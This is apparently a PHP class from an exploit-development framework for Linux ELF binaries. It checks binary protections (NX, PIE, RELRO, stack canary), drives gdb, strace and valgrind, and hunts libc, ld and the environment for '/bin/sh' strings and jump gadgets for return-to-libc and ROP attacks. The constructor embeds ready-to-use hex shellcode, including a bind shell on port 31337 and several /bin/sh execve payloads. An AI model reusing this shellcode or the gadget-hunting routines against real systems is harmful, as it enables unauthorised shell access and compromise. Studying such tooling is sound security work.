<?php
/*
 * signaux : kill -l
 * 
 * cat /var/log/apport.log
 * 
 Userland protections We Face 
	- ASCII Armor Zones
	- NX
	- ASLR
	- PIE
	- RELRO
	- Stack Canary
	- D_FORTIFY_SOURCE
	- PTR_MANGLE
 */
class bin4linux extends BIN{

    
	var $all_reg_32;
	var $lib_linux_libc_32 ;
	var $lib_linux_ld_32;
	var $lib_linux_libc_64 ;
	var $lib_linux_ld_64;
	var $shellcode_bind_31337_port_32_bits_no_fork_linux;
	var $shellcode_date_linux ;
	var $shellcode_bin_sh;
	var $shellcode_hello_world;
	var $shellcode_id ;
	
    

	public function __construct($bin) {
	parent::__construct($bin);
	
	$this->all_reg_32 = array("eax","ebx","ecx","edx","esi","edi"); // 
	$this->lib_linux_libc_32 = '/lib/i386-linux-gnu/libc.so.6'; //  ls -al /lib32/libc.so.6 -> libc-2.19.so
	$this->lib_linux_ld_32 = '/lib32/ld-linux.so.2'; // ls -al /lib32/ld-linux.so.2 ->  /lib32/ld-2.19.so
	$this->lib_linux_libc_64 = '/lib/x86_64-linux-gnu/libc.so.6'; // ls -al /lib/x86_64-linux-gnu/libc.so.6 -> /lib/x86_64-linux-gnu/libc-2.19.so
	$this->lib_linux_ld_64 = '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2';//ls -al /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.19.so
	
	$this->shellcode_bind_31337_port_32_bits_no_fork_linux = '\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5d\x52\x66\xbd\x69\x7a\x0f\xcd\x09\xdd\x55\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\xb3\x04\xb0\x66\xcd\x80\x5f\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x93\xb0\x02\xcd\x80\x85\xc0\x75\x1a\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xb2\x6a\x06\x58\xcd\x80\xb3\x04\xeb\xc9';
	$this->shellcode_date_linux = '\xb8\xe7\xc2\xdf\xef\xda\xd8\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x0b\x31\x45\x12\x83\xc5\x04\x03\xa2\xcc\x3d\x1a\x46\xda\x99\x7c\xc4\xba\x71\x52\x8b\xcb\x65\xc4\x64\xbf\x01\x15\x12\x10\xb0\x7c\x8c\xe7\xd7\x2d\xb8\xfd\x17\xd2\x38\x9a\x76\xa6\x5d\x62\x2e\x15\x14\x83\x1d\x19';
	//$shellcode_date2_linux = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	$this->shellcode_hello_world = '\x31\xc0\x31\xdb\x31\xd2\x68\x72\x6c\x64\x21\xc6\x44\x24\x03\x0a\x68\x6f\x20\x77\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xb0\x04\xb3\x01\xcd\x80\xb2\x0c\x01\xd4';
	$this->shellcode_bin_sh = '\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e';
	//$this->shellcode_bin_sh_2 = '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh';
	$this->shellcode_id = '\x31\xc9\x83\xe9\xf6\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xbc\xb2\xfb\x7c\x83\xee\xfc\xe2\xf4\xd6\xb9\xa3\xe5\xee\xd4\x93\x51\xdf\x3b\x1c\x14\x93\xc1\x93\x7c\xd4\x9d\x99\x15\xd2\x3b\x18\x2e\x54\xb1\xfb\x7c\xbc\xdb\x9f\x7c\xeb\xe1\x72\x9d\x71\x32\xfb\x7c';
	
	}
	
	public function for4linux_Dyn4invest_preload_library($host, $cmd) {
	    $this->for4linux_Dyn4invest_cmd($host, "$this->vm_tmp_lin/preloadcheck $cmd");
	    $this->for4linux_Dyn4invest_cmd($host, "gdb --batch -q -ex \"b dlsym\" -ex \"bt\" -ex \"run\" $cmd");
	}

	
	public  function elf2header(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "readelf -h $this->file_path ";
	    return $query;
	}

	public  function elf2debug(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "clamscan --debug --leave-temps $this->file_path ";
	    return $query;
	}
	
	public function elf2dump() {
	if (!file_exists("/opt/memdump/memdump")) $this->install_for_memdump();
	$this->requette("/opt/memdump/memdump -d $this->file_dir -p `pidof $this->file_path` ");
	return $this;
	}

	public function elf2exec() {
	$this->requette("chmod +x $this->file_path");
	$this->requette($this->file_path);
	return $this;
	}
	
	public function elf2checksec(){
	    $this->ssTitre(__FUNCTION__);
	    $this->requette("bash $this->dir_c/checksec.sh --file $this->file_path");
	    $this->elf2checksec4RELRO();
	    $this->elf2checksec4CANARY();
	    $this->elf2checksec4NX();
	    $this->elf2checksec4PIE();
	    $this->elf2checksec4rpath();
	    $this->elf2checksec4runpath();
	}
	
	public function elf2checksec4NX(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "readelf -W -l $this->file_path 2>/dev/null | grep 'GNU_STACK' | grep 'RWE' ";
	    $check_nx = $this->req_ret_str($query);
	    if (!empty($check_nx)) {$this->rouge("NX DISABLED");return TRUE;}
	    else {$this->note("NX ENABLED");return FALSE;}
	}	
	public function elf2checksec4PIE(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "readelf -h $this->file_path 2>/dev/null | grep 'Type:[[:space:]]*EXEC' ";
	    $check_1 = $this->req_ret_str($query);
	    if (!empty($check_1)) {$this->note("NOT ELF FILE");return FALSE;}
	    else {
	        $query = "readelf -h $this->file_path 2>/dev/null | grep 'Type:[[:space:]]*DYN' ";
	        $check_2 = $this->req_ret_str($query);
	        if (!empty($check_2)) {
	            $query = "readelf -d $this->file_path 2>/dev/null | grep '(DEBUG)' ";
	            $check_3 = $this->req_ret_str($query);
	            if (!empty($check_3)) {$this->note("PIE ENABLED");return TRUE;}
	            else {$this->note("DSO");}
	        
	        }
	        else $this->rouge("PIE DISABLED");

	            
	}
	}
	
	public function elf2checksec4RELRO(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "readelf -l $this->file_path 2>/dev/null | grep 'GNU_RELRO'";
	    $check_full = $this->req_ret_str($query);
	    if (!empty($check_full)) {
	        $query = "readelf -d $this->file_path 2>/dev/null | grep 'BIND_NOW' ";
	        $check_partial = $this->req_ret_str($query);
	        if (!empty($check_partial)) {$this->note("FULL RELRO");return "FULL";}
	        else {$this->note("PARTIAL RELRO");return "PARTIAL";}
	    }
	    else {$this->note("No RELRO");return "NO";}
	}
	


	public function elf2checksec4CANARY(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "readelf -s $this->file_path 2>/dev/null | grep '__stack_chk_fail' ";
	    $check = $this->req_ret_str($query);
	    if (!empty($check)) {$this->note("CANARY FOUND");return TRUE;}
	    else {$this->rouge("CANARY NOT FOUND");return FALSE;}
	}
	
	
	public function elf2checksec4runpath(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "readelf -d $this->file_path 2>/dev/null | grep 'runpath' ";
	    $check = $this->req_ret_str($query);
	    if (!empty($check)) {$this->rouge("RUNPATH FOUND");return TRUE;}
	    else {$this->note("RUNPATH NOT FOUND");return FALSE;}
	}
	
	public function elf2checksec4rpath(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "readelf -d $this->file_path 2>/dev/null | grep 'rpath' ";
	    $check = $this->req_ret_str($query);
	    if (!empty($check)) {$this->rouge("RPATH FOUND");return TRUE;}
	    else {$this->note("RPATH NOT FOUND");return FALSE;}
	}
	

	public function elf2struct(){
	$this->ssTitre("structure du Programme ELF as C ");
	return $this->req_ret_tab("dumpelf $this->file_path | tee $this->file_path.dumpelf");
	}
	
	public function elf2heap($argv){
	$this->titre(__FUNCTION__);
	$this->elf2ltrace($argv);
	$this->elf2strace($argv);
	$this->elf2mtrace($argv);
	$this->elf2valgrind($argv);
	}
	
	public function elf2heap4display($display_int,$run){
	    $this->ssTitre(__FUNCTION__);
	    $display_int = intval($display_int);
	    $start = $this->elf2heap4start($run);
	    return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b free\" -ex \"r \$($run)\" -ex \"x/$display_int"."x $start\" "));    
	}
	
	public function elf2valgrind($argv){
	    $this->ssTitre(__FUNCTION__);
	    return trim($this->req_ret_str("valgrind --trace-malloc=yes $this->file_path $argv "));
	    
	}
	
	public function elf2heap4start($argv){
	    $this->ssTitre(__FUNCTION__);
	    return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b free\" -ex \"r \$($argv)\" -ex \"info proc mappings\" 2>&1 | grep -m1 \"\[heap\]\" | cut -d' ' -f2"));
	}
	
	
	public function elf2syscall($argv){
	$this->article("strace", "System call trace (strace) is a tool that is based on the ptrace(2) system call, and it utilizes the PTRACE_SYSCALL request in a loop to show information about the system
call (also known as syscalls ) activity in a running program as well as signals that are caught during execution. 
This program can be highly useful for debugging, or just to collect information about what syscalls are being called during runtime.
This is the strace command used to trace a basic program:
strace -s 999 -v -f /bin/ls -o ls.out
The strace command used to attach to an existing process is as follows:
strace -p <pid> -o daemon.out
The initial output will show you the file descriptor number of each system call that takes a file descriptor as an argument, such as this:
SYS_read(3, buf, sizeof(buf));
If you want to see all of the data that was being read into file descriptor 3, you can run the following command:
strace -e read=3 /bin/ls
You may also use -e write=fd to see written data.");
	
	return trim($this->req_ret_str("strace -s 999 -v -f $this->file_path $argv "));
	}
	
	public function elf2syscall4bt($breakpoint_before,$breakpoint_after,$argv) {
	    $cmd = trim($cmd);
	    $cmd_gdb = addcslashes($cmd, '"\\'); // b main
	    $this->requette("echo \"
set disassembly-flavor intel
printf \\\"BreakPoint at: $breakpoint_before\\\"
b $breakpoint_before
printf \\\"BreakPoint at: $breakpoint_after\\\"
b $breakpoint_after
run \\$($argv)
printf \\\"continue\\\"
c
printf \\\"Info Registers EIP:\\\"
x/i \\\$eip
printf \\\"Backtrace:\\\"
bt
printf \\\"Info Frame:\\\"
info frame
printf \\\"Display Strings EIP:\\\"
x/s \\\$eip
printf \\\"Display 32 Hex ESP:\\\"
x/128xw \\\$esp
printf \\\"Info ALL Registers:\\\"
i r
printf \\\"Display 32 Hex Ptr EIP:\\\"
x/32xw *\\\$eip
printf \\\"Display Stats Proc\\\"
info proc stat
\" | tee $this->file_dir/$this->file_name.bt");
	    $this->requette("gdb -q --batch -x $this->file_dir/$this->file_name.bt $this->file_path");
	    // $this->pause();
	}
	
	
	public function elf2debug4payload($cmd) {
	$cmd = trim($cmd);
	$cmd_gdb = addcslashes($cmd, '"\\'); // b main
	$this->requette("echo \"
set disassembly-flavor intel
b main
run \\$($cmd_gdb)
printf \\\"Info Registers EIP:\n\\\"
x/i \\\$eip
printf \\\"Backtrace:\n\\\"\n
bt
printf \\\"Info Frame:\n\\\"
info frame
printf \\\"Display Strings EIP:\n\\\"
x/s \\\$eip
printf \\\"Display 32 Hex ESP:\n\\\"
x/128xw \\\$esp
printf \\\"Info ALL Registers:\n\\\"
i r
printf \\\"Display 32 Hex Ptr EIP:\n\\\"
x/32xw *\\\$eip
printf \\\"Display Stats Proc\n\\\"
info proc stat
\" | tee $this->file_dir/gdb_debug_payload.txt");
	$this->requette("gdb -q --batch -x $this->file_dir/gdb_debug_payload.txt $this->file_path");
	// $this->pause();
	}
	
	public function elf2str2addr($str){
	$dlls = $this->elf2dlls();
	$dlls[] = $this->file_path;
	$tab_addr_all = array();
	
	
	foreach ($dlls as $dll) {
	$str = trim($str);
	$tab_addr = array();
	$this->titre("searching $str on $dll ");
	$this->requette("cat $dll | strings | grep -e \"$str$\" ");
	$this->requette("ROPgadget --string \"$str\" --binary $dll | grep \"$str\" | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.ropgadget.tmp");
	$this->requette("ropper --string \"$str\" --file $dll | grep \"$str\" | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.ropper.tmp ");
	$this->requette("strings -a -t x $dll | grep -e \"$str\$\" | grep -Po \"[0-9a-f]{4,8}\" | grep -Po \"^[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.strings.tmp");
	$this->requette("/usr/share/framework2/msfelfscan -r \"$str\" $dll | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.msfelfscan.tmp ");
	$this->requette("env | egrep -e \"$str\$\" ");
	system("cat $this->file_dir/$this->file_name.ropgadget.tmp $this->file_dir/$this->file_name.ropper.tmp $this->file_dir/$this->file_name.strings.tmp $this->file_dir/$this->file_name.msfelfscan.tmp | sort -u > $this->file_dir/$this->file_name.str.addr ");
	$tmp = file("$this->file_dir/$this->file_name.str.addr");
	
	//if (!empty($tmp)) $tmp = array_map("+hexdec", $array1)
	$tab_addr = array_merge($tmp,$tab_addr);
	
	}
	
	$tab_addr = file("$this->file_dir/$this->file_name.str.addr");
	if (!empty($tab_addr)){
	$tab_addr = array_map("trim",$tab_addr);
	$tab_addr = array_map("$this->hex2norme_32",$tab_addr);
	$tab_addr = array_unique($tab_addr);
	array_multisort($tab_addr);
	}
	$this->article("Addr $str on $this->file_path", count($tab_addr));
	//var_dump($tab_addr);
	$this->tab($tab_addr);
	return $tab_addr;
	}
	
	public function elf2libc4path(){
	return trim($this->req_ret_str("gdb -q --batch $this->file_path  -ex \"r \" -ex \"info sharedlibrary\" | grep libc  | grep -Po -i \"/[[:print:]]{1,}/libc.so.6\$\" | tail -1 "));
	}
	
	public function elf2ld4path(){
	return trim($this->req_ret_str("gdb -q --batch $this->file_path  -ex \"r \" -ex \"info sharedlibrary\" | grep 'ld-linux.so.2'  | grep -Po -i \"/[[:print:]]{1,}/ld-linux.so.2\$\" | tail -1 ")); //"/lib/ld-linux.so.2";
	}
	
	public function elf2addr4reg4jmp2offset($reg,$dll_path) {
	$this->ssTitre("GET Local JMP $reg and OFFSET ");
	
	$dll_name = trim(basename($dll_path));
	$file_output = "$this->file_dir/$this->file_name.so.$dll_name.all.jmp.offset";
	if(file_exists($file_output))  return file($file_output);
	
	$this->requette("ropper --nocolor --search \"jmp % [$reg + %]\" --file $dll_path  | grep $reg  > $this->file_dir/$this->file_name.so.$dll_name.ropper.jmp.offset  ");
	$start_lib_addr = $this->elf2addr4lib_start($dll_path);
	$this->requette("cat $this->file_dir/$this->file_name.so.$dll_name.ropper.jmp.offset | grep -Po \"0x[0-9a-fA-F]{7,8}\" | sort -u > $file_output");
	$tab_rst = file("$this->file_dir/$this->file_name.so.$dll_name.all.jmp.offset");
	$tab_new_addr = array();
	foreach ($tab_rst as $jump_reg)
	$tab_new_addr[] = $this->addr2add4hex($start_lib_addr,$jump_reg);
	
	return $this->tab2file($tab_new_addr,$file_output);
	}
	
	public function elf2reg4offset($reg,$dll) {
	
	$dll = trim($dll);
	$reg = trim($reg);
	$file_output = "$this->file_dir/$this->file_name.all.jmp.offset";
	if(file_exists($file_output))  {
	if ($dll == "all") {
	$dlls = $this->elf2dlls();
	if (! empty($dlls)) foreach($dlls as $dll_path) $this->elf2addr4reg4jmp2offset($reg,$dll_path);
	} else $this->elf2addr4reg4jmp2offset($reg,$dll);
	
	}
	$this->elf2addr4reg4jmp2offset($reg,$this->file_path);
	$this->pause();
	
	
	$this->requette("cat $this->file_dir/$this->file_name.so.*.all.jmp.offset | sort -u > $file_output  ");
	//$this->remarque("enlever des $reg dans ce fichier si vous voulez juste qlq exemples");
	$this->requette("gedit $file_output");
	$this->pause();
	return file($file_output);
	}
	
	
	
	

	public function elf2addr4bin_sh_only() {
	$this->titre("searching All shell ");
	$libc_file = $this->elf2libc4path();
	$this->titre("search shell in LIBC");
	$base_libc = $this->elf2addr4libc_start();
	$end_libc = $this->elf2addr4libc_end();	
	return $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"find $base_libc,$end_libc,\\\"/bin/sh\\\"\" $this->file_path | grep -Po \"^0x[0-9a-f]{1,8}\" ")));
	}
	
	
	public function elf2addr4bin_sh_all() {
	$this->titre("searching All shell ");
	$file_shell_output = "$this->file_dir/$this->file_name.shell.addr.all";
	if (file_exists($file_shell_output)) { $this->remarque("File Exists $file_shell_output");return file($file_shell_output);}
	
	
	$shells = array("/bin/sh","sh","/bin/bash","bash","/bin/dash","dash","rbash","/bin/rbash");
	 
	$libc_file = $this->elf2libc4path();
	$ld_file = $this->elf2ld4path();
	
	$final = array();
	$all_shell_addr = array();
	$shell_libc = array();
	$shell_ld = array();
	$shell_env = array();
	$shell_prog = array();
	$all_shells = array();
	$this->pause();
	
	$this->titre("search shell in env");
	$this->requette("env | egrep -e \"(bash|/bin/bash$|/bin/sh$|sh$|dash$|/bin/dash$|rbash$|/bin/rbash$)\" ");
	$shell_env[] = $this->elf2addr4env("RBENV_SHELL");
	$shell_env[] = $this->elf2addr4env("SHELL");
	$this->pause();
	
	
	$this->titre("search shell in LIBC");
	$base_libc = $this->elf2addr4libc_start();
	$end_libc = $this->elf2addr4libc_end();
	foreach($shells as $shell) {
	$this->titre("Searching $shell on LIBC ");
	$this->requette("cat $libc_file | strings | grep -e \"$shell$\" ");
	/*
	 $this->requette("ROPgadget --string \"$shell\" --binary $libc_file | grep \"$shell\" | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.libc.ropgadget.tmp | wc -l ");
	 $this->requette("ropper --string \"$shell\" --file $libc_file | grep \"$shell\" | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.libc.ropper.tmp | wc -l  ");
	 $this->requette("strings -a -t x $libc_file | grep -e \"$shell\$\" | grep -Po \"[0-9a-f]{4,8}\" | grep -Po \"^[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.libc.strings.tmp | wc -l ");
	 $this->requette("/usr/share/framework2/msfelfscan -r \"$shell\" $libc_file | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.libc.msfelfscan.tmp | wc -l ");
	 system("cat $this->file_dir/$this->file_name.libc.ropgadget.tmp $this->file_dir/$this->file_name.libc.ropper.tmp $this->file_dir/$this->file_name.libc.strings.tmp $this->file_dir/$this->file_name.libc.msfelfscan.tmp | sort -u > $this->file_dir/$this->file_name.libc.str.addr ");
	 $tmp = file("$this->file_dir/$this->file_name.libc.str.addr");
	 $tmp = array_map("trim",$tmp);
	 if (!empty($tmp)){
	$tmp = array_map("$this->hex2norme_32",$tmp);
	for($i=0;$i<=count($tmp);$i++) if(!empty($tmp[$i])) $shell_libc[] = $this->hex2norme_32($this->addr2add($tmp[$i],hexdec($base_libc)));
	unset($tmp);
	}
	*/
	$this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"find $base_libc,$end_libc,\\\"$shell\\\"\" $this->file_path | grep -Po \"^0x[0-9a-f]{1,8}\" | tee  $this->file_dir/$this->file_name.libc.gdb.tmp | wc -l ");
	$tmp2 = file("$this->file_dir/$this->file_name.libc.gdb.tmp");
	$shell_libc = array_merge($tmp2,$shell_libc);
	unset($tmp2);
	$shell_libc = array_unique($shell_libc);
	array_multisort($shell_libc);
	}
	
	$this->article("Shell ALL Addr on LIBC", count($shell_libc));
	$this->tab($shell_libc);
	$this->pause();
	
	
	$this->titre("search shell in LD");
	$base_ld = $this->elf2addr4ld_start();
	$end_ld = $this->elf2addr4ld_end();
	foreach($shells as $shell) {
	$this->titre("Searching $shell on LD ");
	$this->requette("cat $ld_file | strings | grep -e \"$shell$\" ");
	/*
	 $this->requette("ROPgadget --string \"$shell\" --binary $ld_file | grep \"$shell\" | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.ld.ropgadget.tmp | wc -l ");
	 $this->requette("ropper --string \"$shell\" --file $ld_file | grep \"$shell\" | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.ld.ropper.tmp | wc -l  ");
	 $this->requette("strings -a -t x $ld_file | grep -e \"$shell\$\" | grep -Po \"[0-9a-f]{4,8}\" | grep -Po \"^[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.ld.strings.tmp | wc -l ");
	 $this->requette("/usr/share/framework2/msfelfscan -r \"$shell\" $ld_file | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.ld.msfelfscan.tmp | wc -l ");
	 system("cat $this->file_dir/$this->file_name.ld.ropgadget.tmp $this->file_dir/$this->file_name.ld.ropper.tmp $this->file_dir/$this->file_name.ld.strings.tmp $this->file_dir/$this->file_name.ld.msfelfscan.tmp | sort -u > $this->file_dir/$this->file_name.ld.str.addr ");
	 $tmp = file("$this->file_dir/$this->file_name.ld.str.addr");
	 $tmp = array_map("trim",$tmp);
	 if (!empty($tmp)){
	$tmp = array_map("$this->hex2norme_32",$tmp);
	for($i=0;$i<=count($tmp);$i++) if(!empty($tmp[$i])) $shell_ld[] = $this->hex2norme_32($this->addr2add($tmp[$i],hexdec($base_ld)));
	unset($tmp);
	}
	*/
	$this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"find $base_ld,$end_ld,\\\"$shell\\\"\" $this->file_path | grep -Po \"^0x[0-9a-f]{1,8}\" | tee  $this->file_dir/$this->file_name.ld.gdb.tmp | wc -l ");
	$tmp2 = file("$this->file_dir/$this->file_name.ld.gdb.tmp");
	$tmp2 = array_map("trim",$tmp2);
	if (!empty($tmp2)){
	$shell_ld = array_merge($tmp2,$shell_ld);
	unset($tmp2);
	$shell_ld = array_unique($shell_ld);
	array_multisort($shell_ld);
	}
	}
	
	$this->article("Shell ALL Addr on LD", count($shell_ld));
	$this->tab($shell_ld);
	$this->pause();
	
	
	$this->titre("search shell in Programme");
	$base_prog = $this->elf2mem_start();
	$end_prog = $this->elf2mem_end();
	foreach($shells as $shell) {
	$this->titre("Searching $shell on PROG ");
	$this->requette("cat $this->file_path | strings | grep -e \"$shell$\" ");
	/*
	 $this->requette("ROPgadget --string \"$shell\" --binary $this->file_path | grep \"$shell\" | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.prog.ropgadget.tmp | wc -l ");
	 $this->requette("ropper --string \"$shell\" --file $this->file_path | grep \"$shell\" | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.prog.ropper.tmp | wc -l  ");
	 //$this->requette("strings -a -t x $this->file_path | grep -e \"$shell\$\" | grep -Po \"[0-9a-f]{4,8}\" | grep -Po \"^[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.prog.strings.tmp | wc -l ");
	 $this->requette("/usr/share/framework2/msfelfscan -r \"$shell\" $this->file_path | grep -Po \"0x[0-9a-f]{4,8}\" | tee $this->file_dir/$this->file_name.prog.msfelfscan.tmp | wc -l ");
	 system("cat $this->file_dir/$this->file_name.prog.ropgadget.tmp $this->file_dir/$this->file_name.prog.ropper.tmp $this->file_dir/$this->file_name.prog.msfelfscan.tmp | sort -u > $this->file_dir/$this->file_name.prog.str.addr ");
	 $tmp = file("$this->file_dir/$this->file_name.prog.str.addr");
	 $tmp = array_map("trim",$tmp);
	 if (!empty($tmp)){
	$tmp = array_map("$this->hex2norme_32",$tmp);
	for($i=0;$i<count($tmp);$i++) if(!empty($tmp[$i])) $shell_prog[] = $this->hex2norme_32($tmp[$i]);
	unset($tmp);
	}
	*/
	$this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"find $base_prog,$end_prog,\\\"$shell\\\"\" $this->file_path | grep -Po \"^0x[0-9a-f]{1,8}\" | tee  $this->file_dir/$this->file_name.prog.gdb.tmp | wc -l ");
	$tmp2 = file("$this->file_dir/$this->file_name.prog.gdb.tmp");
	$tmp2 = array_map("trim",$tmp2);
	if (!empty($tmp2)){
	$shell_prog = array_merge($tmp2,$shell_prog);
	unset($tmp2);
	$shell_prog = array_unique($shell_prog);
	array_multisort($shell_prog);
	}
	}
	
	$this->article("Shell ALL Addr on PROG", count($shell_prog));
	$this->tab($shell_prog);
	$this->pause();
	
	$all_shell_addr = array_merge($shell_libc, $shell_ld, $shell_prog, $shell_env);
	$all_shell_addr = array_map("trim",$all_shell_addr);
	$count_tab_all_shell = count($all_shell_addr);
	for($i=0;$i<$count_tab_all_shell;$i++)
	$all_shell_addr[$i] = $this->hex2norme_32($all_shell_addr[$i]);
	$all_shell_addr = array_unique($all_shell_addr);
	array_multisort($all_shell_addr);
	
	foreach ($all_shell_addr as $val ) if(!empty(trim($val))) $final[] = $val;
	$this->article("ALL Shells Addr", count($final));
	
	$file_shell = fopen($file_shell_output, "w");
	foreach($final as $addr_shell) fputs($file_shell, "$addr_shell\n");
	fclose($file_shell);
	$this->note("Enlever qlq addr si vous ne voulez pas tout tester ");
	$this->requette("cat $file_shell_output | sort -u | grep -v -E \"(20\$|00\$|0a\$)\" | tee $file_shell_output | wc -l");
	$this->requette("gedit $file_shell_output ");
	return file($file_shell_output);
	}
	
	
	
	
	
	
	public function elf2search_string_env($chaine, $start, $end) {
	$this->titre("Search \"$chaine\" ");
	$query = "env | strings | egrep -e \"$chaine\$\" ";
	$tmp = $this->req_ret_tab($query);
	// $this->requette("ROPgadget --string \"$chaine\" --binary $load ");
	if (empty($tmp))
	return "";
	else {
	$this->requette("echo \"b main\\nr AAAA\\nfind $start,$end,\\\"$chaine\\\"\" > $this->file_dir/cmd_gdb.txt");
	// $this->requette("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path ");
	$found = trim($this->req_ret_str("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path | grep found | cut -d' ' -f1"));
	$this->important("Found $found $chaine");
	$found =(int) $found + 1;
	$addr = $this->req_ret_tab("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path | tail -$found | grep '0x' | grep -v \"00\" | grep -v \"20\" | grep -v \"0a\"  ");
	}
	return $addr;
	}
	
	public function elf2search_string($chaine, $start, $end, $load) {
	$this->titre("Search \"$chaine\" ");
	$query = "cat $load | strings | egrep -e \"$chaine\$\" ";
	$tmp = $this->req_ret_tab($query);
	// $this->requette("ROPgadget --string \"$chaine\" --binary $load ");
	if (empty($tmp))
	return "";
	else {
	$this->requette("echo \"b main\\nr AAAA\\nfind $start,$end,\\\"$chaine\\\"\" > $this->file_dir/cmd_gdb.txt");
	// $this->requette("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path ");
	$found = trim($this->req_ret_str("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path | grep found | grep -Po \"[0-9]{1,}\" "));
	$this->note("Found $found $chaine");
	$found =(int) $found + 1;
	$addr = $this->req_ret_tab("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path | tail -$found | grep '0x'   ");
	}
	return $addr;
	}
	
	public function elf2string4hex($hex,$argv) {
	$hex = $this->hex2norme_32($hex);
	$this->titre("Content in $hex with ASCII/strings Display");
	$query = "gdb -q --batch -ex \"b main\" -ex \"r $argv\" -ex \"x/s $hex\" $this->file_path | tail -1";
	$this->requette($query);
	exec("$query | cut -d':' -f2", $tmp);
	$tmp2 = trim($tmp [0]);	unset($tmp);
	return trim($tmp2);
	}
	
	public function elf2symbol4hex($hex) {
	$hex = $this->hex2norme_32($hex);
	$this->titre("Symbol in $hex");
	$this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"info symbol $hex\" $this->file_path | tail -1");
	}
	public function elf2asm4hex($hex) {
	$hex = $this->hex2norme_32($hex);
	$this->titre("Instruction in $hex");
	$this->titre("AT&T Display");
	$this->requette("gdb --batch -q -ex \"r AA\" -ex \"x/i $hex\" $this->file_path | tail -1");
	$this->titre("NASM Display");
	$this->requette("gdb --batch -q -ex 'set disassembly-flavor intel' -ex \"r AA\" -ex \"x/i $hex\" $this->file_path | tail -1");
	exec("gdb --batch -q -ex 'set disassembly-flavor intel' -ex \"r AA\" -ex \"x/i $hex\" $this->file_path | tail -1 | cut -d':' -f2  ", $asm);
	return $asm;
	}
	
	
	
	
	
	public function elf2opcode4hex($hex) {
	$hex = $this->hex2norme_32($hex);
	$this->titre("OpCode in $hex");
	$this->requette("gdb --batch -q -ex \"r AA\" -ex \"x/bx $hex\" $this->file_path | tail -1");
	}
	


	public function elf2addr4content_hex($hex,$argv) {
	$hex = trim($hex);
	$argv = trim($argv);
	$hex = $this->hex2norme_32($hex);
	$this->titre("Content in $hex with Hex display");
	$query = "gdb -q --batch -ex \"b main\" -ex \"r $argv\" -ex \"x/x $hex\" $this->file_path | tail -1";
	$this->requette($query);
	return trim($this->req_ret_str("$query | cut -d':' -f2"));
	}
	
